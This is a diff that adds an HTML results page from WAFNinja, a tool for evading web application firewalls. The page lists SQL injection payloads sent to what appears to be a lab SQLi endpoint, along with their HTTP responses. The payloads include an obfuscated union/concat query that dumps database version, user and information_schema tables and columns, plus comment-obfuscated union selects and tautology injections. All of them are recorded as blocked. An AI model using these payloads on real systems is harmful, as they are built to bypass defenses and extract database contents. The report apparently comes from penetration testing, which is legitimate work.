@@ -1,0 +1,144 @@
+<meta charset="utf-8"/><style>
+        .OutputTable {
+	margin:0px;padding:0px;
+	width:100%;
+	border:1px solid #000000;
+	
+	-moz-border-radius-bottomleft:10px;
+	-webkit-border-bottom-left-radius:10px;
+	border-bottom-left-radius:10px;
+	
+	-moz-border-radius-bottomright:10px;
+	-webkit-border-bottom-right-radius:10px;
+	border-bottom-right-radius:10px;
+	
+	-moz-border-radius-topright:10px;
+	-webkit-border-top-right-radius:10px;
+	border-top-right-radius:10px;
+	
+	-moz-border-radius-topleft:10px;
+	-webkit-border-top-left-radius:10px;
+	border-top-left-radius:10px;
+	table-layout: fixed;
+        }.OutputTable table{
+            border-collapse: collapse;
+                border-spacing: 0;
+                width:310px;
+                height:100%;
+                margin:0px;padding:0px;
+        }.OutputTable tr:last-child td:last-child {
+                -moz-border-radius-bottomright:10px;
+                -webkit-border-bottom-right-radius:10px;
+                border-bottom-right-radius:10px;
+        }
+        .OutputTable table tr:first-child td:first-child {
+                -moz-border-radius-topleft:10px;
+                -webkit-border-top-left-radius:10px;
+                border-top-left-radius:10px;
+        }
+        .OutputTable table tr:first-child td:last-child {
+                -moz-border-radius-topright:10px;
+                -webkit-border-top-right-radius:10px;
+                border-top-right-radius:10px;
+        }.OutputTable tr:last-child td:first-child{
+                -moz-border-radius-bottomleft:10px;
+                -webkit-border-bottom-left-radius:10px;
+                border-bottom-left-radius:10px;
+        }.OutputTable tr:hover td{
+                background-color:#ffffff;
+        }
+        .OutputTable td{
+                vertical-align:middle;
+                background-color:#ffffff;
+                width:500px; 
+                word-wrap: break-word;
+            height: 15px;
+                border:1px solid #000000;
+                border-width:0px 1px 1px 0px;
+                text-align:center;
+                padding:9px;
+                font-size:15px;
+                font-family:Helvetica;
+                font-weight:normal;
+                color:#000000;
+        }.OutputTable tr:last-child td{
+                border-width:0px 1px 0px 0px;
+        }.OutputTable tr td:last-child{
+                border-width:0px 0px 1px 0px;
+        }.OutputTable tr:last-child td:last-child{
+                border-width:0px 0px 0px 0px;
+        }
+        .OutputTable tr:first-child th{
+                        background:-o-linear-gradient(bottom, #007fff 5%, #007fff 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #007fff), color-stop(1, #007fff) );
+                background:-moz-linear-gradient( center top, #007fff 5%, #007fff 100% );
+                filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#007fff", endColorstr="#007fff");	background: -o-linear-gradient(top,#007fff,007fff);
+
+                background-color:#007fff;
+                border:0px solid #000000;
+                text-align:center;
+                border-width:0px 0px 1px 1px;
+                font-size:15px;
+                font-family:Courier;
+                font-weight:bold;
+                color:#ffffff;
+        }
+        .OutputTable tr:first-child:hover td{
+                background:-o-linear-gradient(bottom, #007fff 5%, #007fff 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #007fff), color-stop(1, #007fff) );
+                background:-moz-linear-gradient( center top, #007fff 5%, #007fff 100% );
+                filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#007fff", endColorstr="#007fff");	background: -o-linear-gradient(top,#007fff,007fff);
+
+                background-color:#007fff;
+        }
+        .OutputTable tr:first-child td:first-child{
+                border-width:0px 0px 1px 0px;
+        }
+        .OutputTable tr:first-child td:last-child{
+                border-width:0px 0px 1px 1px;
+        }
+        .OutputTable td.Yes{
+                background-color:#00FF00;
+        }
+        .OutputTable td.No{
+                background-color:#FF0000;
+        }
+        .OutputTable td.Probably{
+                background-color:#00CCFF;
+        }
+            </style><h1>WAFNinja - Penetration testers favorite for WAF Bypassing</h1><b>URL</b>: http://169.254.179.84/vulnerabilities/sqli/?id=PAYLOAD<br><b>TYPE: </b>sql<br><b>DELAY: </b>0<br><b>PROXY: </b><br><b>PREFIX: </b><br><b>POSTFIX: </b><br><br><table class="OutputTable">
+    <tr>
+        <th>Payload</th>
+        <th>HTTP Status</th>
+        <th>Content-Length</th>
+        <th>Working</th>
+    </tr>
+    <tr>
+        <td>a'or 2=2--</td>
+        <td>403</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>/*!00000concat*/(0x63726561746f723a2064705f6d6d78,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))</td>
+        <td>403</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</td>
+        <td>403</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>1 AND (select DCount(last(username)&amp;after=1&amp;after=1) from users where username=ad1min)</td>
+        <td>403</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+    <tr>
+        <td>1 AND (select DCount(last(username)&amp;after=1&amp;after=1) from users where username='ad1min')</td>
+        <td>403</td>
+        <td>-</td>
+        <td class="No">No</td>
+    </tr>
+</table>
